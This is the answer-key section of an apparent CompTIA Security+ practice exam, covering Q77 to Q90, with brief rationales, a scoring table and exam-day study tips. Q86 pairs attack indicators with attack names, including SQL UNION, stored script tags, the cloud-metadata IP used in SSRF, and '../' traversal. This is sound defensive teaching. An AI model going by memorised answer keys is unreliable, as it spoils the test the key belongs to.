**Q77. Answer: B — RAM (volatile memory).** Order of volatility. **Wrong:** A (Disk), C (Email logs), D (Tapes) are less volatile. **Takeaway.** Capture RAM first.

**Q78. Answer: A — Degaussing.** Degaussing doesn't work on SSDs (flash, not magnetic). **Wrong:** B/C/D all work on SSDs. **Takeaway.** SSDs: crypto-erase / vendor-erase / shred. NEVER degauss.

**Q79. Answer: A — ALE.** SLE × ARO. **Wrong:** B (EF), C (AV), D (ROI) wrong. **Takeaway.** ALE = SLE × ARO.

**Q80. Answer: B — Maximum acceptable downtime.** RTO. **Wrong:** A (Data loss) is RPO. C (MTTR) is engineering. D (Retention) is policy. **Takeaway.** RTO = downtime.

**Q81. Answer: B — 3 copies, 2 different media, 1 off-site.** **Wrong:** Other variants invented. **Takeaway.** 3-2-1.

**Q82. Answer: A — BAA.** HIPAA. **Wrong:** B (SLA), C (MOU), D (DPA = GDPR) wrong. **Takeaway.** HIPAA → BAA.

**Q83. Answer: D — Known-vulnerable third-party dependencies.** SCA. **Wrong:** A (Custom-code injection) is SAST. B (IDS) wrong. C (Phishing) wrong. **Takeaway.** SCA = dependencies.

**Q84. Answer: B — In use.** Confidential computing (TEEs). **Wrong:** A (At rest), C (Transit), D (Archived) are other states. **Takeaway.** Confidential computing = in use.

**Q85. Answer: C — Pseudonymization reversible with mapping; anonymization irreversible.** GDPR. **Wrong:** A (Identical) wrong. B (Pseud stronger) backwards. D (bcrypt) unrelated. **Takeaway.** Pseud + mapping = GDPR-applicable; Anon = out of scope.

**Q86. Answer: A — SQLi, Stored XSS, SSRF, Directory traversal, Open redirect.** Each indicator → its attack name. **Wrong:** B/C/D misidentify the cloud-metadata IP (SSRF), persisted scripts (Stored XSS), and `../` (traversal). **Takeaway.** PBQ lookup: UNION → SQLi; persistent `<script>` → Stored XSS; `169.254.169.254` → SSRF; `../` → traversal; `?next=` → open redirect.

**Q87. Answer: A — C → B → D → E → F → G → A.** NIST IR phases: D&A (scope + memory) → Containment (isolate) → Eradication (wipe) → Recovery (restore) → Lessons (meeting + playbook). **Wrong:** B starts with Eradication (skips Detection). C starts with Lessons. D mis-orders Containment. **Takeaway.** Always: scope+evidence → contain → eradicate → recover → lessons.

**Q88. Answer: A — DMZ/Secure/Internal/Management correct assignments.** Standard layered architecture. **Wrong:** B/C scramble. D oversimplifies. **Takeaway.** Public-facing → DMZ; data tier → Secure; users → Internal; admin → Management; WAF in front of DMZ; NIDS at chokepoint SPAN.

**Q89. Answer: A — HR $100k / Website $50k; mitigate both.** HR: SLE = $2M × 0.25 = $500k; ALE = $500k × 0.20 = $100k. Website: SLE = $100k × 0.50 = $50k; ALE = $50k × 1.0 = $50k. Both warrant mitigation (controls). **Wrong:** B/C/D produce wrong calculations or extreme treatments. **Takeaway.** Math the ALE; choose mitigate when controls cost < ALE; avoid only if no business case for the asset; accept only with executive sign-off below appetite.

**Q90. Answer: A — SOW under MSA + SLA / DPA / BAA / MOU / ISA.** Each contract type matches its scenario precisely. **Wrong:** B substitutes NDA/BPA. C substitutes ISA/BAA/DPA/MSA incorrectly. D treats all as MSAs. **Takeaway.** Each contract has a specific purpose. SOW=project; SLA=performance; DPA=GDPR; BAA=HIPAA; MOU=non-binding; ISA=system interconnection; MSA=umbrella.

---

## 📊 Scoring

| Score | Verdict |
|-------|---------|
| 84–90 | 🏆 Book the real exam this week — you're ready |
| 75–83 | ✅ Passing margin — fix the misses, take 1–2 more nights review, then book |
| 65–74 | ⚠️ Borderline — review weak domains for a week, retake |
| <65 | 🔁 Don't book yet — significant gaps in 2+ domains |

---

## 🔍 Final Review Process

For EVERY missed question:
1. Note the **domain** (Domain 1-5) and **module** it came from
2. Tally missed by domain — is one domain dominating? That's your weak spot
3. Re-read the relevant Reading.md sections
4. Update flashcards
5. Take Professor Messer's free Sec+ practice exam at https://www.professormesser.com/

### Common weak-domain remediation
- Weak in **Crypto (M2)** → Computerphile videos + Cloudflare's TLS posts
- Weak in **IAM (M3)** → Auth0's "Intro to IAM" series
- Weak in **Attacks (M5)** → John Hammond / IppSec walkthroughs
- Weak in **Network (M6)** → PracticalNetworking.net IPSec series
- Weak in **Ops (M8)** → MyDFIR's IR/forensics videos
- Weak in **GRC (M9)** → Sometimes pure flashcard memorization is faster than re-reading

---

## 🎯 The Day Before The Real Exam

- ❌ Do NOT take another full practice exam
- ✅ Review flashcards (especially acronyms)
- ✅ Re-read each module's Cheat-Sheet.md
- ✅ Sleep 7+ hours
- ✅ Eat protein
- ✅ Plan to arrive 30 min early
- ✅ Bring 2 forms of ID

## 🎯 During The Real Exam

- 90 questions in 90 minutes = 1 min/question average. **PBQs take 3-5x longer.**
- **Skip PBQs first** if you start there — do all MCQs, then return to PBQs with remaining time
- Flag uncertain MCQs and revisit if time allows
- Trust your first instinct on multiple-choice — don't over-think
- For PBQs, eliminate clearly wrong options first
- Always answer — there's no penalty for guessing

You've got this. 🛡️
